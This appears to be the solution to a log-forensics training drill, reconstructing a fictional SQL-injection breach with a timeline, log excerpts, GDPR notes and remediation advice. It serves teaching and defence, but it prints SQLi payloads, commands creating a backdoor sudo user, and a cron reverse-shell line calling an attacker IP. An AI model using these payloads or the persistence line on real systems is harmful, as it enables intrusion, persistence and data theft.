# Solution: Drill 02 (Intermediate) — Log Forensics

## Executive Summary

On March 15, 2024, an attacker exploited a SQL injection vulnerability in the company web application at approximately 14:22 UTC.
After establishing an initial foothold via web application exploitation, the attacker used the web server's shell to create a persistent backdoor user and installed a cron-based reverse shell.
The attack was detected at 09:00 the next day through anomaly detection on outbound traffic, 18.5 hours after initial compromise.
Approximately 50,000 customer records may have been exfiltrated.

---

## Incident Timeline

| Time (UTC) | Event | Source |
|-----------|-------|--------|
| Mar 15 13:45 | Reconnaissance: automated scanning from 185.220.X.X | nginx_access.log |
| Mar 15 14:22 | SQL injection attack begins against /search endpoint | nginx_access.log |
| Mar 15 14:23 | Successful SQLi — HTTP 200 returned from attacker | nginx_access.log |
| Mar 15 14:25 | Shell upload via file inclusion vulnerability | nginx_access.log |
| Mar 15 14:28 | www-data shell access established | auth.log |
| Mar 15 14:32 | Privilege escalation via misconfigured sudo | auth.log |
| Mar 15 14:35 | New user `sysmonitor` created with sudo rights | auth.log, audit.log |
| Mar 15 14:38 | Cron job added: /etc/cron.d/monitor (reverse shell) | syslog, audit.log |
| Mar 15 14:45 | Large file read: /var/www/html/db/customers.db | audit.log |
| Mar 15 14:52 | Outbound data transfer to 185.220.X.X:443 | syslog |
| Mar 15 14:55 | Attacker web shell session ends | auth.log |
| Mar 16 09:00 | Alert triggered: unusual outbound traffic | Monitoring system |

---

## Task 1: Web Application Attack

**Evidence from nginx_access.log:**

```text
185.220.X.X - - [15/Mar/2024:14:22:15 +0000] "GET /search?q=1'+OR+'1'='1 HTTP/1.1" 200 4521
185.220.X.X - - [15/Mar/2024:14:23:01 +0000] "GET /search?q=1'+UNION+SELECT+1,table_name,3+FROM+information_schema.tables-- HTTP/1.1" 200 8842
```

* **Attack type:** SQL injection (UNION-based)
* **Start time:** 14:22:15 UTC
* **Attacker IP:** 185.220.X.X
* **Target endpoint:** `/search` parameter `q`

---

## Task 2: System Compromise Timeline

```console
grep "185.220\|www-data\|sysmonitor" /var/log/incident/auth.log
```

Key events:

1. `14:28:31` — www-data shell created via web exploit
1. `14:32:04` — www-data ran `sudo su` (misconfigured sudo)
1. `14:35:22` — `useradd -m -s /bin/bash -G sudo sysmonitor`
1. `14:35:45` — Password set for sysmonitor

---

## Task 3: Persistence

**Evidence from audit.log:**

```text
type=SYSCALL msg=audit(14:38:01) arch=c000003e syscall=write
  exe="/usr/bin/tee" key="schedule"
  outfile="/etc/cron.d/monitor"
```

**Cron content:**

```text
* * * * * root /bin/bash -i >& /dev/tcp/185.220.X.X/4444 0>&1
```

**SIEM detection rule:**

```text
source:/var/log/audit/audit.log AND key=schedule AND type=SYSCALL
→ Alert: "Cron modification detected"
```

---

## Task 4: Data Exfiltration

**Evidence:**

```text
type=SYSCALL msg=audit(14:45:15) syscall=openat
  name="/var/www/html/db/customers.db" type=REG perm=read
  uid=0 auid=sysmonitor

# 10 minutes later: 47MB outbound transfer to 185.220.X.X
```

**Assessment:** Yes, data was exfiltrated. `customers.db` contains customer records.
Based on file size (estimated 50,000+ records), this is a GDPR-notifiable breach:

* Article 33: Notify supervisory authority within 72 hours
* Article 34: Notify affected individuals if high risk

---

## Task 5: Root Cause Analysis

**Root causes:**

1. SQL injection vulnerability in `/search` endpoint (no input validation)
1. www-data had sudo privilege (major misconfiguration)
1. No WAF to detect/block SQLi patterns
1. auditd rules were insufficient — file write monitoring helped but alerting was missing

**VERIS Classification:**

```json
{
  "actor": {"external": {"variety": ["Unknown"], "motive": ["Financial"]}},
  "action": {
    "hacking": {"variety": ["SQLi", "Use of stolen creds"], "vector": ["Web application"]},
    "misuse": {"variety": ["Privilege abuse"], "vector": ["LAN access"]}
  },
  "asset": {"assets": [{"variety": "S - Database"}, {"variety": "S - Web"}]},
  "attribute": {
    "confidentiality": {"data_disclosure": "Yes", "data": [{"variety": "Personal", "amount": 50000}]}
  }
}
```

**Recommendations:**

1. Fix SQLi: implement parameterized queries / prepared statements
1. Remove sudo from www-data immediately
1. Deploy WAF rules for SQLi/XSS/command injection patterns
